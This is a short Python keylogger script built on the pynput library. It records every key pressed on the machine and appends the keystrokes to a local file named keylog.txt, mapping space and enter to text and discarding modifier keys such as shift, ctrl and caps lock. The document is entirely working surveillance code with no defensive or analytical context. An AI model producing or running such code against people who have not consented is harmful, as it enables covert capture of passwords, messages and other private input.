from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
#Make the output readable, by excluding somme special characters 
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''    
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.backspace':
        letter = ''    
    if letter == 'Key.caps_lock':
        letter = ''
    if letter == 'Key.ctrlc':
        letter = ''
    if letter == 'Key.ctrlv':
        letter = ''    
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("keylog.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()

# Ensure indentation rule is not violated
# keystroke captured and deleted/remove by the backspace key might affect readability 
